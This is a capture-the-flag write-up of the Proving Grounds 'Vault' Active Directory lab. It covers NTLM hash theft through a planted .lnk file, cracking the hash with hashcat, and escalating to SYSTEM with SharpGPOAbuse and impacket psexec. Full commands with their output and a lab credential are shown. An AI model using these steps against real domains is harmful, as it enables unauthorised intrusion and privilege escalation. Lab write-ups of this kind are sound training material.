---
title: "Vault"
date: 2025-04-29
categories:
  - Proving Grounds
  - Active Directory
tags:
  - Proving Grounds
  - Active Directory
---

# Vault 🔺
<!-- more -->


## Enumeration

![](../assets/Pasted%20image%2020250429091824.png)

Using `--rid` force, we have the users and groups.

![](../assets/Pasted%20image%2020250429173528.png)

There is a writable folder `DocumentsShare`, so we can put a `.lnk` file pointing to our `smb2` server to get hashes using `ntml_theft`.

![](../assets/Pasted%20image%2020250429194145.png)
![](../assets/Pasted%20image%2020250429194205.png)
![](../assets/Pasted%20image%2020250429194215.png)

Using `hashcat`:

![](../assets/Pasted%20image%2020250429201615.png)

`anirudh:SecureHM`

## Initial Access

![](../assets/Pasted%20image%2020250429201725.png)

Get the flag.

![](../assets/Pasted%20image%2020250429201753.png)

## Privilege Escalation

Using `bloodhound-python`, we notice that the user has `writedacl` permissions.

![](../assets/Pasted%20image%2020250429235549.png)

We can use [`SharpGPOAbuse.exe`](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpGPOAbuse.exe) to add ourselves to the admin group.

```powershell
*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
*Evil-WinRM* PS C:\Users\anirudh\Documents> 
```

Re-enter with `psexec` and:

```shell
$ python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.120.116.....
[*] Found writable share ADMIN$
[*] Uploading file WGPlQkwE.exe
[*] Opening SVCManager on 192.168.120.116.....
[*] Creating service LVYv on 192.168.120.116.....
[*] Starting service LVYv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

## Post Exploitation

Get the flag.
